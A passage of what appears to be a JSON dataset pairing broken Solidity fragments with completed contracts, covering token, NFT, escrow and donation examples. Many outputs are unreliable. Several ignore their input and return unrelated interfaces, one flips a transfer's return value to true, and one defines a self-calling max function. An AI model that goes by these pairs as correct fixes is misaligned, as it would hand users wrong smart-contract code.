        "input": "uint key = \"abc\";\nmyMap[key] = 123;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyMap {\n    mapping(bytes32 => uint) myMap;\n    \n    \n    \n    \n    \n    \n  function setKey (bytes32 key) public {\n    myMap[key] = 123;\n  }\n}\n\n"
    },
    "132.sol": {
        "input": "function getNftTokenHolder(address _nft, unit _tokenIds) public returns (address[]) {\n    address[] memory addr = new address[](_tokenIds);\n    for (uint i; i < _tokenIds; i++) {\n        addr[i] = INft(_nft).ownerOf(i);\n    }\n\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface INft {\n    function ownerOf(uint256 tokenId) external view returns (address);\n}\n\ncontract MyContract {\n    function getNftTokenHolder(address _nft, uint256[] memory _tokenIds) public returns (address[] memory) {\n        address[] memory addr = new address[](_tokenIds.length);\n        for (uint256 i; i < _tokenIds.length; i++) {\n            addr[i] = INft(_nft).ownerOf(_tokenIds[i]);\n        }\n        return addr;\n    }\n}\n"
    },
    "135.sol": {
        "input": "    function callMint(address tokenAddress, Param param) external {\n        address _owner = param.owner;\n        uint256 _amount = param.amount;\n        bytes4 _selector = 0x40c10f19;  \n        assembly {\n            let calldataOffset := mload(0x40)\n            \n            mstore(0x40, add(calldataOffset, 0x44))\n            \n            mstore(calldataOffset, _selector)\n            mstore(add(calldataOffset, 0x04), _owner)\n            mstore(add(calldataOffset, 0x24), _amount)\n            \n            let result := call(\n                gas(),\n                tokenAddress,\n                0,               \n                calldataOffset,\n                0x44,\n                0,               \n                0                \n            )\n            \n            if eq(result, 0) {\n                returndatacopy(0, 0, returndatasize())\n                revert(0, returndatasize())\n            }\n        }\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    struct Param {\n        address owner;\n        uint256 amount;\n    }\n    \n    function callMint(address tokenAddress, Param memory param) external {\n        address _owner = param.owner;\n        uint256 _amount = param.amount;\n        bytes4 _selector = 0x40c10f19;  \n        assembly {\n            let calldataOffset := mload(0x40)\n            \n            mstore(0x40, add(calldataOffset, 0x44))\n            \n            mstore(calldataOffset, _selector)\n            mstore(add(calldataOffset, 0x04), _owner)\n            mstore(add(calldataOffset, 0x24), _amount)\n            \n            let result := call(\n                gas(),\n                tokenAddress,\n                0,               \n                calldataOffset,\n                0x44,\n                0,               \n                0                \n            )\n            \n            if eq(result, 0) {\n                returndatacopy(0, 0, returndatasize())\n                revert(0, returndatasize())\n            }\n        }\n    }\n}\n\n"
    },
    "136.sol": {
        "input": "                    if (x < sellSymbols.length) {\n                        sellSymbols[x] = sellSymbols[sellSymbols.length - 1];\n                        delete sellSymbols[myArray.length - 1];\n                        sellSymbols.length--;\n                    } else {\n                        delete sellSymbols;\n                    }\n\nfunction except(string _item, mapping(string => bool) _ownedSymbols, mapping(string => bool) _targetAssets) internal returns (bool) {\n    return _ownedSymbols[_item] && !_targetAssets[_item];\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    string[] public sellSymbols;\n    \n    mapping(string => bool) public ownedSymbols;\n    mapping(string => bool) public targetAssets;\n\n    function sellSymbol(uint x) public {\n        if (x < sellSymbols.length) {\n            sellSymbols[x] = sellSymbols[sellSymbols.length - 1];\n            sellSymbols.pop();\n        } else {\n            delete sellSymbols;\n        }\n    }\n\n    function except(string memory _item) internal view returns (bool) {\n        return ownedSymbols[_item] && !targetAssets[_item];\n    }\n}\n\n"
    },
    "137.sol": {
        "input": "const huskoToken = await HuskoToken.deploy(\n    supply.toLocaleString('fullwide', {useGrouping:false}),\n    fee,\n    feeTaker,\n    maxSupply.toLocaleString('fullwide', {useGrouping:false})\n);\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract HuskoToken {\n    function getSupply(address) external view returns (uint256);\n}\n\n"
    },
    "138.sol": {
        "input": "function expand(\n    uint256 randomValue, \n    uint256 n\n) public pure returns (uint256[] memory expandedValues) {\n    expandedValues = new uint256[](n);\n    for (uint256 i = 0; i < n; i++) {\n        expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n    }\n    return expandedValues;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract expand_random_values {\n\n  function expand(\n    uint256 randomValue, \n    uint256 n\n  ) public pure returns (uint256[] memory expandedValues) {\n    expandedValues = new uint256[](n);\n    for (uint256 i = 0; i < n; i++) {\n        expandedValues[i] = uint256(keccak256(abi.encode(randomValue, i)));\n    }\n    return expandedValues;\n  }\n\n}\n\n"
    },
    "139.sol": {
        "input": "uint256 public mintCost = 0.05 ether;\n\nfunction setCost(uint256 _newCost) public onlyOwner {\n        mintCost = _newCost;\n }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  \n  function mint(address to, uint256 amount) external returns (bool);\n  \n}\n\n"
    },
    "140.sol": {
        "input": "pragma solidity ^0.8.9;\n\ncontract Lock {\n\n    event DataStoredNonAnonymous(address admin, uint256 indexed data);\n    event DataStoredAnonymous(address admin, uint256 indexed data) anonymous;\n   \n    uint256 x;\n    uint256 y;\n   \n    function storeDataNonAnonymous(uint256 _data) external {\n      x = _data;\n      emit DataStoredNonAnonymous(msg.sender, _data);\n    }\n\n    function storeDataAnonymous(uint256 _data) external {\n      y = _data;\n      emit DataStoredAnonymous(msg.sender, _data);\n    }\n\n}\n\nimport { ethers } from \"hardhat\";\n\nasync function main() {\n  const Lock = await ethers.getContractFactory(\"Lock\");\n  const lock = await Lock.deploy();\n\n  await lock.deployed();\n\n  console.log(`deployed to ${lock.address}`);\n  const tx1 = await lock.storeDataNonAnonymous(10);\n  const txReceipt1 = await tx1.wait()\n  console.log(\"event non-anonymous\",txReceipt1.events)\n\n  const tx2 = await lock.storeDataAnonymous(12345);\n  const txReceipt2 = await tx2.wait()\n  console.log(\"event anonymous\",txReceipt2.events)\n\n}\n\nmain().catch((error) => {\n  console.error(error);\n  process.exitCode = 1;\n});\n\nCompiled 1 Solidity file successfully\ndeployed to 0x5FbDB2315678afecb367f032d93F642f64180aa3\nevent non-anonymous [\n  {\n    transactionIndex: 0,\n    blockNumber: 2,\n    transactionHash: '0x22e2b2c6274a83e0c6ff9e2733e7875940e038f3faf5641d77ede41958657fa0',\n    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',\n    topics: [\n      '0xe70463dc16bf49899544f11b2caa7874683dbf886102edb6cbc82d728dc425d4',\n      '0x000000000000000000000000000000000000000000000000000000000000000a'\n    ],\n    data: '0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266',\n    logIndex: 0,\n    blockHash: '0x1491b08df4abb9ac8aaeb3be796ab0635957668224470944fd215400a02ce276',\n    args: [\n      '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',\n      BigNumber { value: \"10\" },\n      admin: '0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266',\n      data: BigNumber { value: \"10\" }\n    ],\n    decode: [Function (anonymous)],\n    event: 'DataStoredNonAnonymous',\n    eventSignature: 'DataStoredNonAnonymous(address,uint256)',\n    removeListener: [Function (anonymous)],\n    getBlock: [Function (anonymous)],\n    getTransaction: [Function (anonymous)],\n    getTransactionReceipt: [Function (anonymous)]\n  }\n]\nevent anonymous [\n  {\n    transactionIndex: 0,\n    blockNumber: 3,\n    transactionHash: '0x76ec1eef5693031441fd0446ab681d3f703cca3a016167b343ad8d75fdfd478f',\n    address: '0x5FbDB2315678afecb367f032d93F642f64180aa3',\n    topics: [\n      '0x0000000000000000000000000000000000000000000000000000000000003039'\n    ],\n    data: '0x000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb92266',\n    logIndex: 0,\n    blockHash: '0xd4f64019225eb982522f8f41a1cc2d6869a7ac41f5d93e5b6f7fb39607914e78',\n    removeListener: [Function (anonymous)],\n    getBlock: [Function (anonymous)],\n    getTransaction: [Function (anonymous)],\n    getTransactionReceipt: [Function (anonymous)]\n  }\n]\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Lock {\n\n    event DataStoredNonAnonymous(address admin, uint256 indexed data);\n    event DataStoredAnonymous(address admin, uint256 indexed data) anonymous;\n   \n    uint256 x;\n    uint256 y;\n   \n    function storeDataNonAnonymous(uint256 _data) external {\n      x = _data;\n      emit DataStoredNonAnonymous(msg.sender, _data);\n    }\n\n    function storeDataAnonymous(uint256 _data) external {\n      y = _data;\n      emit DataStoredAnonymous(msg.sender, _data);\n    }\n\n}\n\n"
    },
    "141.sol": {
        "input": "ParserError: Function, variable, struct or modifier declaration expected.\n  --> stable coin lil.sol:54:1:\n   |\n54 | \n   | ^\n\nfunction marketing(uint256 amount) public onlyOwner {\n  uint256 marketingTaxAmount = amount.mul(MARKETING_TAX).div(100);\n\n  _transfer(address(this), _msgSender(), marketingTaxAmount);\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract Owners {\n\n  address public owner;\n  mapping (address=>bool) public admins;\n\n  constructor(address _owner) {\n    owner = _owner;\n    admins[msg.sender] = true;\n  }\n\n  modifier onlyOwner() {\n    require(\n      msg.sender == owner,\n      \"Only the contract owner can perform this action\"\n    );\n    _;\n  }\n\n}\n\n"
    },
    "142.sol": {
        "input": "  uint public listingPrice=0.025 ether;\n\nrequire(msg.value==listingPrice,\"Price must be equal to listing fee\");\n\nfunction setListingPrice(uint newPrice) external onlyOwner{\n    require(newPrice>0,\"Price must be at least 1 wei\");\n    listingPrice=newPrice;\n  }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface Ownable {\n    function owner() external view returns (address);\n\n    function transferOwnership(address newOwner) external;\n}\n\n"
    },
    "143.sol": {
        "input": "mapping(address => uint) public balanceOf;\n\n    uint balance0 = IERC20(token0).balanceOf(address(this));\n    uint balance1 = IERC20(token1).balanceOf(address(this));\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account) external view returns (uint);\n}\n\n"
    },
    "144.sol": {
        "input": "constructor(address _tokenAddress) public {\n  token = IERC20(_tokenAddress);\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n  function balanceOf(address account) external view returns (uint256);\n}\n\ncontract TokenHolder {\n  IERC20 private token;\n\n  constructor(address _tokenAddress) public {\n    token = IERC20(_tokenAddress);\n  }\n\n  function getBalance() public view returns (uint256) {\n    return token.balanceOf(address(this));\n  }\n}\n\n"
    },
    "145.sol": {
        "input": "pragma solidity ^0.8;\n\ncontract UniswapV2Pair {\n}\n\ncontract MyContract {\n    function createPair() external {\n        bytes32 salt = 0x1234567890123456789012345678901234567890123456789012345678901234;\n        address pair = address(\n            new UniswapV2Pair{salt: salt}()\n        );\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ncontract UniswapV2Pair {\n}\n\ncontract MyContract {\n    function createPair() external {\n        bytes32 salt = 0x1234567890123456789012345678901234567890123456789012345678901234;\n        address pair = address(\n            new UniswapV2Pair{salt: salt}()\n        );\n    }\n}\n\n"
    },
    "146.sol": {
        "input": "(bool success, bytes memory data) = payable(manager).call{value: fee}(\"\");\nrequire(sent, \"transfer failed\");\n\nReason: missing revert data in call exception; Transaction reverted without a reason string\n\n    function withdrawDonations(\n        uint256 _id\n    ) public authorisedPerson(_id) returns (bool) {\n        (uint256 raisedAmount, uint256 fee) = calculatePlatformFee(_id);\n\n        require(fee <= (address(this).balance), \"fee in excess of balance\");\n\n        payable(manager).transfer(fee);\n        emit Action(_id, \"Funds Withdrawn\", msg.sender, block.timestamp);\n        return true;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IPaymaster {\n\n    function withdrawFunds() external payable;\n\n}\n\n"
    },
    "147.sol": {
        "input": "{\n  networks: {\n    hardhat: {\n      blockGasLimit: 1000000000\n    },\n  }\n}\n\n\n",
        "output": "pragma solidity ^0.4.25;\ncontract ERC20 {\n  function balanceOf(address account) external view returns (uint256);\n  function transfer(address to, uint256 value) external returns (bool);\n  function transferFrom(address from, address to, uint256 value) external returns (bool);\n}\n\n"
    },
    "148.sol": {
        "input": "AggregatorV3Interface dataFeed = AggregatorV3Interface(0x9326....);\n\n(\n  uint80 roundID, \n  int price,\n  uint startedAt,\n  uint timeStamp,\n  uint80 answeredInRound\n) = priceFeed.latestRoundData();\n\n\n",
        "output": "pragma solidity ^0.8.9;\n    interface AggregatorV3Interface {\n      \n      function latestRoundData() external view returns (\n        uint80 roundID, \n        int price,\n        uint startedAt,\n        uint timeStamp,\n        uint80 answeredInRound\n      );\n    }\n\n"
    },
    "149.sol": {
        "input": "function totalSupply() public view returns (uint256) {\n  return _totalSupply;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyCryptoArtNFT {\n\n  string public baseURI = \"https://cryptart.io\";\n\n  uint256 _totalSupply = 420;\n\n\n  function totalSupply() public view returns (uint256) {\n    return _totalSupply;\n  }\n\n  event Transfer(address indexed from, address indexed to, uint256 indexed tokens);\n\n  mapping(address => uint256) public tokenToAddress;\n\n  constructor() {\n    for (uint256 i = 0; i < _totalSupply; i++) {\n      address wallet = msg.sender;\n      tokenToAddress[wallet] = i;\n      emit Transfer(address(0), wallet, i);\n    }\n  }\n}\n\n"
    },
    "150.sol": {
        "input": "contract example{\n    receive() external payable {\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract example{\n    receive() external payable {\n    }\n}\n\n"
    },
    "151.sol": {
        "input": "pragma solidity ^0.8;\n\ninterface I {\n    function foo() external;\n}\n\ncontract C is I {\n    function foo() override external {\n    }\n\n    function otherFunction() external {\n    }\n}\n\ncontract Factory {\n    function deploy() external {\n        I i = new C();\n        i.foo();\n\n        C c = new C();\n        c.foo();\n        c.otherFunction();\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8;\n\ninterface I {\n    function foo() external;\n}\n\ncontract C is I {\n    function foo() override external {\n        // implements the `foo()` function of the `I` interface\n    }\n\n    function otherFunction() external {\n    }\n}\n\ncontract Factory {\n    function deploy() external {\n        // the `I` type variable `i` can only invoke the `foo()` function\n        I i = new C();\n        i.foo();\n\n        // the `C` type variable `c` can invoke the `otherFunction()` as well\n        C c = new C();\n        c.foo();\n        c.otherFunction();\n    }\n}\n\n"
    },
    "152.sol": {
        "input": "contract Demo {\n\n    uint number;\n\n    function set(uint _number) public {\n        number = _number + 1;\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Demo {\n\n    uint number;\n\n    function set(uint _number) public {\n        number = _number + 1;\n    }\n}\n\n"
    },
    "153.sol": {
        "input": "contract UQ112x112 {\n    uint224 constant Q112 = 2**112;\n\n    function encode(uint112 y) public pure returns (uint224 z) {\n        z = uint224(y) * Q112; \n    }\n    function uqdiv(uint224 x, uint112 y) public pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n\nfunction encode(uint112 y) internal pure returns (uint224 z) {\n      z = uint224(y) * Q112; \n  }\n\n10000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000\n\nfunction uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n   z = x / uint224(y);\n} \n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract UQ112x112 {\n    uint224 constant Q112 = 2**112;\n\n    function encode(uint112 y) public pure returns (uint224 z) {\n        z = uint224(y) * Q112; \n    }\n    function uqdiv(uint224 x, uint112 y) public pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n\ncontract UQ112 {\n    uint224 constant Q112 = 2**112;\n\n    function encode(uint112 y) internal pure returns (uint224 z) {\n        z = uint224(y) * Q112; \n    }\n\n    function uqdiv(uint224 x, uint112 y) internal pure returns (uint224 z) {\n        z = x / uint224(y);\n    }\n}\n\n"
    },
    "154.sol": {
        "input": " require(!_kryptoBirdzExists[_kryptoBird],\n\n _kryptoBirdzExists[_kryptoBird]=true;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract KryptoBirds {\n    uint public _kryptoBirds = 0;\n    mapping(address => bool) public _kryptoBirdzExists;\n\n}\n\n"
    },
    "155.sol": {
        "input": "function getOwnerByIndex(uint index) public view returns (uint256) {\n\n    return tokenOfOwnerByIndex(address(msg.sender), index);\n}\n\nfunction getOwnerByIndex(uint256 index) public view returns (address) {\n    uint256 tokenId = tokenByIndex(index);\n    address owner = ownerOf(tokenId);\n    return owner;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\nabstract contract ERC721 {\n\n    function tokenOfOwnerByIndex(address owner, uint index) public virtual view returns (uint256 tokenId);\n\n    function ownerOf(uint256 tokenId) public view virtual returns (address owner);\n\n    function tokenByIndex(uint index) public view virtual returns (uint256);\n}\n\n"
    },
    "156.sol": {
        "input": " function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        return false;\n    }\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    function transfer(address to, uint256 amount) public virtual returns (bool) {\n        // Transfer logic here\n        \n        return true;\n    }\n}\n"
    },
    "157.sol": {
        "input": "            if(block.timestamp < timeStamp + 60){\n                revert timeError(timeStamp, tokenIds[i]);\n            }\n\n            require(block.timestamp > timeStamp + 60,\"not past due time\");\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract TimeBased {\n    event timeError(uint256 timeStamp, uint256 tokenId);\n    mapping(uint256 => uint256) public tokenTimeStamps;\n\n    function checkTime(uint256 tokenId) public {\n        uint256 timeStamp = tokenTimeStamps[tokenId];\n        \n        if(block.timestamp < timeStamp + 60){\n            emit timeError(timeStamp, tokenId);\n            revert(\"Not past due time\");\n        }\n        \n        require(block.timestamp > timeStamp + 60,\"Not past due time\");\n        // Add the action you want to happen after the time check here\n    }\n\n    function setTokenTimeStamp(uint256 tokenId, uint256 timeStamp) public {\n        // Add any necessary checks or modifiers for setting a token's timestamp\n        tokenTimeStamps[tokenId] = timeStamp;\n    }\n}\n\n"
    },
    "158.sol": {
        "input": "_totalSupply = 1_000_000 * 1e18;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract CreamFinance {\n    string public name;\n    string public symbol; \n    uint public decimals;   \n    uint256 public totalSupply;\n   \n    constructor() public {\n        name = \"CreamFinance\";\n        symbol = \"CAFT\";\n        decimals = 18;  \n        totalSupply = 1_000_000 * 1e18;      \n    }\n}\n\n"
    },
    "159.sol": {
        "input": "CompilerError: Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables. When compiling inline assembly: Variable headStart is 1 slot(s) too deep inside the stack. Stack too deep. Try compiling with `--via-ir` (cli) or the equivalent `viaIR: true` (standard JSON) while enabling the optimizer. Otherwise, try removing local variables.\n\npragma solidity 0.8.20;\n\ncontract DonationContract {\n    struct Donation {\n        string pickupDate;\n        string pickupTime;\n        string availabilityDate;\n        string pickupHours;\n        string itemType;\n        string otherItem;\n        string itemDescription;\n        uint quantity;\n        string requiresRefrigeration;\n        string bestConsumedDate;\n        string partialDonation;\n    }\n\n    Donation[] public donations;\n\n    function createDonation(\n        string memory _pickupDate,\n        string memory _pickupTime,\n        string memory _availabilityDate,\n        string memory _pickupHours,\n        string memory _itemType,\n        string memory _otherItem,\n        string memory _itemDescription,\n        uint _quantity,\n        string memory _requiresRefrigeration,\n        string memory _bestConsumedDate,\n        string memory _partialDonation\n    )\n\n    public {\n        Donation memory newDonation = Donation(\n            _pickupDate,\n            _pickupTime,\n            _availabilityDate,\n            _pickupHours,\n            _itemType,\n            _otherItem,\n            _itemDescription,\n            _quantity,\n            _requiresRefrigeration,\n            _bestConsumedDate,\n            _partialDonation\n        );\n        donations.push(newDonation);\n    }\n    function getDonationCount() public view returns (uint){\n        return donations.length;\n    }\n}\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract DonationContract {\n    struct Donation {\n        string pickupDate;\n        string pickupTime;\n        string availabilityDate;\n        string pickupHours;\n        string itemType;\n        string otherItem;\n        string itemDescription;\n        uint quantity;\n        string requiresRefrigeration;\n        string bestConsumedDate;\n        string partialDonation;\n    }\n\n    Donation[] public donations;\n\n    function createDonation(\n        string memory _pickupDate,\n        string memory _pickupTime,\n        string memory _availabilityDate,\n        string memory _pickupHours,\n        string memory _itemType,\n        string memory _otherItem,\n        string memory _itemDescription,\n        uint _quantity,\n        string memory _requiresRefrigeration,\n        string memory _bestConsumedDate,\n        string memory _partialDonation\n    )\n    \n    public {\n        Donation memory newDonation = Donation(\n            _pickupDate,\n            _pickupTime,\n            _availabilityDate,\n            _pickupHours,\n            _itemType,\n            _otherItem,\n            _itemDescription,\n            _quantity,\n            _requiresRefrigeration,\n            _bestConsumedDate,\n            _partialDonation\n        );\n        donations.push(newDonation);\n    }\n    function getDonationCount() public view returns (uint) {\n        return donations.length;\n    }\n}\n\n"
    },
    "160.sol": {
        "input": "contract Escrow {\n\naddress owner;\n\nstruct Deposit {\n    uint256 depositAmount;\n    address buyer;\n    address seller;\n}\n\nconstructor() payable {\nowner = msg.sender;\n}\n\nmapping(bytes32 => Deposit) public depositByHash; \n\nevent DepositMade(address depositor, uint depositAmount, bytes32 hash);\n\nfunction deposit(address _seller) public payable returns(bytes32) {\n\n    require(msg.value > 0, \"error\"); \n\n    bytes32 hash = keccak256(abi.encode(msg.value, block.timestamp, _seller)); \n\n    Deposit storage _deposit = depositByHash[hash]; \n\n    _deposit.depositAmount = msg.value; \n\n    _deposit.buyer = msg.sender;\n    \n    _deposit.seller = _seller;  \n\n    emit DepositMade(msg.sender, msg.value, hash);\n\n    return hash; \n}\n\nfunction releaseDeposit(bytes32 hash) public {\n\n    require (msg.sender == depositByHash[hash].buyer, \"Only maker of the deposit can release deposit.\");\n\n    payable(depositByHash[hash].seller).transfer(depositByHash[hash].depositAmount);\n}\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Escrow {\n\naddress owner;\n\nstruct Deposit {\n    uint256 depositAmount;\n    address buyer;\n    address seller;\n}\n\nconstructor() payable {\nowner = msg.sender;\n}\n\nmapping(bytes32 => Deposit) public depositByHash; \n\nevent DepositMade(address depositor, uint depositAmount, bytes32 hash);\n\nfunction deposit(address _seller) public payable returns(bytes32) {\n\n    require(msg.value > 0, \"error\"); \n\n    bytes32 hash = keccak256(abi.encode(msg.value, block.timestamp, _seller)); \n\n    Deposit storage _deposit = depositByHash[hash]; \n\n    _deposit.depositAmount = msg.value; \n\n    _deposit.buyer = msg.sender;\n    \n    _deposit.seller = _seller;  \n\n    emit DepositMade(msg.sender, msg.value, hash);\n\n    return hash; \n}\n\nfunction releaseDeposit(bytes32 hash) public {\n\n    require (msg.sender == depositByHash[hash].buyer, \"Only maker of the deposit can release deposit.\");\n\n    payable(depositByHash[hash].seller).transfer(depositByHash[hash].depositAmount);\n}\n}\n\n"
    },
    "161.sol": {
        "input": "require(msg.value >= amount * tokenPrice[tokenId], \"Not enough funds\")\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC20 {\n  function getTokenPrice() external view returns(uint);\n}\n\n"
    },
    "162.sol": {
        "input": "amount = _amount * 1e18;\n\namount = _amount * (10 ** 18);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract ERC20Interactable {\n\n    constructor (uint256 _amount, string memory _symbol, string memory _name) public {\n     \n     amount = _amount * 1e18;\n    \n     amount = _amount * (10 ** 18);\n    }\n\n    receive() external payable {\n     \n     amount = _amount * 1e18;\n    \n     amount = _amount * (10 ** 18);\n    }\n\n    uint public constant decimals = 18;\n\n    string private symbol;\n    string private name;\n    uint256 private _amount;\n    uint256 private amount;\n}\n\n"
    },
    "163.sol": {
        "input": "function foo() external payable {\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract HelloWorld {\n    function foo() external payable {\n    }\n}\n\n"
    },
    "164.sol": {
        "input": "contract MyERC721 is ERC721 {\n   ...\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface ERC721 {\n    function mint() external;\n}\n\n"
    },
    "166.sol": {
        "input": "constructor(address _contractAddress) {\n    new = contractA(_contractAddress);\n    owner = new.owner();\n}\n\n function setOwnership(address newOwner) private {\n        owner = payable(newOwner);\n    } \n\nfunction set_data(string memory _data) public {\n    owner=setOwnership(msg.sender);\n    require(owner == msg.sender,\"You are not the owner of the contract\");\n    data = _data;\n    blocknumber = block.number;\n}\n\nmapping(address => bool) private whiteList;\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface IERC20 {\n    function balanceOf(address account)\n        external view returns (uint256);\n}\n\nabstract contract Context {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n}\n\n"
    },
    "167.sol": {
        "input": "interface InterfaceB {\n    function getMessage() external pure  returns(string memory);\n}\n\n  function getMessage() external pure returns(string memory);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ninterface InterfaceB {\n     function getMessage() external pure  returns(string memory);\n}\n\n"
    },
    "168.sol": {
        "input": "   address payable private owner;\n\nconstructor() {\n    setOwner(msg.sender);\n  }\n\nfunction setOwner(address newOwner) private {\n    owner = payable(newOwner);\n  }\n\n function withdraw() external onlyOwner {\n     (bool success,)=owner.call{value:address(this).balance}(\"\");\n     require(success,\"Transfer failed!\");\n   }\n\n modifier onlyOwner() {\n    if (msg.sender != getContractOwner()) {\n      revert OnlyOwner();\n    }\n    _;\n  }\n\n  error OnlyOwner();\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Owner {\n  address payable private owner;\n\n  constructor() {\n    setOwner(msg.sender);\n  }\n\n  function setOwner(address newOwner) private {\n    owner = payable(newOwner);\n  }\n\n  function withdraw() external onlyOwner {\n     (bool success,)=owner.call{value:address(this).balance}(\"\");\n     require(success,\"Transfer failed!\");\n   }\n\n   modifier onlyOwner() {\n    if (msg.sender != getContractOwner()) {\n      revert OnlyOwner();\n    }\n    _;\n  }\n\n   function getContractOwner() private view returns (address) {\n    return owner;\n  }\n\n   error OnlyOwner();\n}\n\n"
    },
    "169.sol": {
        "input": "import \"openzeppelin-contracts/utils/math/Math.sol\";\n\nuint256 max = Math.max(a, b);\n\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract Math {\n\n    function max(uint256 a, uint256 b) internal pure returns (uint256) {\n        return Math.max(a, b);\n    }\n}\n\n"
    },
    "171.sol": {
        "input": "function setGreetings(string calldata _message){\nmessage=_message;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract GreetingExample {\n\n    function setGreetings(string calldata _message) external {\n        message=_message;\n    }\n\n    string public message;\n}\n\n"
    },
    "172.sol": {
        "input": "pragma solidity ^0.5.13;\n\ncontract TransferMoney {  \n    uint public receivedBalance;\n\n    function ReceiveMoney() public payable{\n        receivedBalance += msg.value;\n    }\n\n    function ShowContractBalance() public view returns(uint){\n        return address(this).balance;\n    }\n\n    function ShowContractBalance(address payable toAccount, uint amount) public{\n        toAccount.transfer(amount);\n    }\n}\n\n\n",
        "output": "pragma solidity ^0.5.13;\n\ncontract TransferMoney {  \n    uint public receivedBalance;\n\n    function ReceiveMoney() public payable{\n        receivedBalance += msg.value;\n    }\n\n    function ShowContractBalance() public view returns(uint){\n        return address(this).balance;\n    }\n\n    function ShowContractBalance(address payable toAccount, uint amount) public{\n        toAccount.transfer(amount);\n    }\n}\n\n"
    },
    "173.sol": {
        "input": "Room memory room = Room(new address[](0), 0, 0);\nrooms.push(room);\n\nrooms[rooms.length-1].players.push(msg.sender);\n\nrooms[rooms.length-1].players.push([address]);\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract MyContract {\n    \n    struct Room {\n        address[] players;\n        uint256 playerCount;\n        uint256 roomId;\n    }\n    \n    Room[] public rooms;\n    \n    function createRoom() public {\n        Room memory room = Room(new address[](0), 0, rooms.length);\n        rooms.push(room);\n    }\n    \n    function joinRoom(uint256 roomId) public {\n        require(roomId < rooms.length, \"Invalid room ID\");\n        rooms[roomId].players.push(msg.sender);\n        rooms[roomId].playerCount++;\n    }\n}\n"
    },
    "174.sol": {
        "input": "mapping(address => uint) public walletIndexIncrementedMap;\nWalletScores[] scores;\n\nstruct WalletScores {\n    adddress wallet;\n    uint256 score;\n}\n\n\nfunction getOrAddWalletScore(address _wallet, uint256 score) public {\n    uint256 incrementedIndex = walletIndexIncrementedMap[_wallet];\n    if(0 == incrementedIndex) {\n        WalletScore storage walletScore = scores.push();\n        incrementedIndex = scores.length;\n        walletIndexIncrementedMap[_wallet] = incrementedIndex;\n        walletScore.wallet = _wallet;\n        walletScore.score = score;\n        return;\n    }\n    WalletScore storage walletScore = scores[incrementedIndex - 1];\n    walletScore.score += score;\n}\n\nfunction getAllScores() public returns (WalletScores[] memory walletScores) \n{\n   return scores;\n}\n\n\n",
        "output": "pragma solidity ^0.8.9;\ncontract WalletScoring {\n    mapping(address => uint256) public walletIndexIncrementedMap;\n    WalletScores[] scores;\n\n    struct WalletScores {\n        address wallet;\n        uint256 score;\n    }\n\n    function getOrAddWalletScore(address _wallet, uint256 score) public {\n        uint256 incrementedIndex = walletIndexIncrementedMap[_wallet];\n        if (0 == incrementedIndex) {\n            WalletScores storage walletScore = scores.push();\n            incrementedIndex = scores.length;\n            walletIndexIncrementedMap[_wallet] = incrementedIndex;\n            walletScore.wallet = _wallet;\n            walletScore.score = score;\n            return;\n        }\n        WalletScores storage walletScore = scores[incrementedIndex - 1];\n        walletScore.score += score;\n    }\n\n    function getAllScores() public view returns (WalletScores[] memory walletScores) {\n        return scores;\n    }\n}\n"
    },
    "175.sol": {
